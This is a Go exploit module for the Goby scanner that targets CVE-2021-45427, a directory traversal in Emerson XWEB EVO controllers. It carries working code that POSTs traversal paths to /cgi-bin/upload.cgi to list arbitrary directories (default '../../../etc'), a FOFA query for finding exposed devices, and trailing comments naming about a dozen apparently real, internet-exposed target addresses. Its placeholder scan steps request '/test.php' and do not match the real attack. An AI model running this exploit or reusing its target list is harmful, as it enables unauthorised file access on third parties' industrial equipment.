package exploits

import (
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EMERSON-XWEB-EVO upload.cgi path Directory Traversal Vulnerability (CVE-2021-45427)",
    "Description": "<p>Emerson XWEB 300D EVO is an energy-saving air conditioner of Emerson Company in the United States.</p><p>Emerson XWEB 300D EVO 3.0.7 -- 3ee403 has a directory traversal vulnerability (CVE-2021-45427). An attacker may access some secret files including configuration files, logs, source codes, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.</p>",
    "Product": "EMERSON-XWEB-EVO",
    "Homepage": "https://climate.emerson.com/en-es/shop/1/climate-technologies/control-and-monitoring-systems/dixell-electronics-xweb-evo-en-gb",
    "DisclosureDate": "2021-12-20",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"src=\\\"img/xweb-logo.png\\\"\" || body=\"src=\\\"/css/images/Logo_XWEB_alpha.png\"",
    "GobyQuery": "body=\"src=\\\"img/xweb-logo.png\\\"\" || body=\"src=\\\"/css/images/Logo_XWEB_alpha.png\"",
    "Level": "1",
    "Impact": "<p>Emerson XWEB 300D EVO is an energy-saving air conditioner of Emerson Company in the United States.</p><p>Emerson XWEB 300D EVO 3.0.7 -- 3ee403 has a directory traversal vulnerability (CVE-2021-45427). An attacker may access some secret files including configuration files, logs, source codes, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to the update in time: <a href=\"https://drive.google.com/file/d/1IN7p9OKRgdszMVC1TKuZQDa4ySCPmQzO/view?usp=sharing\">https://drive.google.com/file/d/1IN7p9OKRgdszMVC1TKuZQDa4ySCPmQzO/view?usp=sharing</a></p>",
    "References": [
        "https://www.cvedetails.com/cve/CVE-2021-45427/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "dirPath",
            "type": "input",
            "value": "../../../etc",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2021-45427"
    ],
    "CNNVD": [
        "CNNVD-202112-2781"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "EMERSON-XWEB-EVO upload.cgi 文件 path 参数目录遍历漏洞（CVE-2021-45427）",
            "Product": "EMERSON-XWEB-EVO",
            "Description": "<p>Emerson XWEB 300D EVO是美国Emerson公司的一款节能空调。</p><p>Emerson XWEB 300D EVO 3.0.7--3ee403 存在目录遍历漏洞（CVE-2021-45427）。攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://drive.google.com/file/d/1IN7p9OKRgdszMVC1TKuZQDa4ySCPmQzO/view?usp=sharing\" target=\"_blank\">https://drive.google.com/file/d/1IN7p9OKRgdszMVC1TKuZQDa4ySCPmQzO/view?usp=sharing</a><br></p>",
            "Impact": "<p>攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "EMERSON-XWEB-EVO upload.cgi path Directory Traversal Vulnerability (CVE-2021-45427)",
            "Product": "EMERSON-XWEB-EVO",
            "Description": "<p>Emerson XWEB 300D EVO is an energy-saving air conditioner of Emerson Company in the United States.<br></p><p>Emerson XWEB 300D EVO 3.0.7 -- 3ee403 has a directory traversal vulnerability (CVE-2021-45427). An attacker may access some secret files including configuration files, logs, source codes, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.<br></p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to the update in time:&nbsp;<a href=\"https://drive.google.com/file/d/1IN7p9OKRgdszMVC1TKuZQDa4ySCPmQzO/view?usp=sharing\" target=\"_blank\">https://drive.google.com/file/d/1IN7p9OKRgdszMVC1TKuZQDa4ySCPmQzO/view?usp=sharing</a><br></p>",
            "Impact": "<p>Emerson XWEB 300D EVO is an energy-saving air conditioner of Emerson Company in the United States.<br></p><p>Emerson XWEB 300D EVO 3.0.7 -- 3ee403 has a directory traversal vulnerability (CVE-2021-45427). An attacker may access some secret files including configuration files, logs, source codes, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-24",
    "PocId": "10809"
}`

	// 定义一个函数，用于发送HTTP请求，并返回响应的Utf8Html
	sendRequest := func(u *httpclient.FixUrl, data string) string {
		uri := "/cgi-bin/upload.cgi"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Accept", "*/*")
		cfg.FollowRedirect = false
		cfg.VerifyTls = false

		cfg.Data = data
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.Utf8Html
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 调用sendRequest函数，传入action=list&path=../../作为data参数
			html := sendRequest(u, "action=list&path=../../")
			return strings.Contains(html, "\"list\":[")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			dirPath := ss.Params["dirPath"].(string)
			// 调用sendRequest函数，传入action=list&path= + dirPath作为data参数
			html := sendRequest(expResult.HostInfo, "action=list&path="+dirPath)
			if strings.Contains(html, "\"list\":[") {
				data := html
				result := ""

				var objmap map[string]interface{}
				err := json.Unmarshal([]byte(data), &objmap)
				if err != nil {
					panic(err)
				}

				// 提取 name 字段
				list := objmap["list"].([]interface{})
				for _, item := range list {
					name := item.(map[string]interface{})["name"].(string)
					result += name + "\n"
				}
				expResult.Output += result
				expResult.Success = true
			}

			return expResult
		},
	))
}

//http://185.20.111.112:7007
//http://185.20.111.112:1260
//http://89.212.90.252:8080
//http://178.143.16.234:2107
//http://93.46.114.83
//http://50.228.172.245
//http://185.20.111.112:9080
//http://185.95.55.133:8080
//http://77.163.188.116:8080
//http://185.20.111.112:8085
//http://178.143.16.234:5236
//http://185.20.111.112:5004
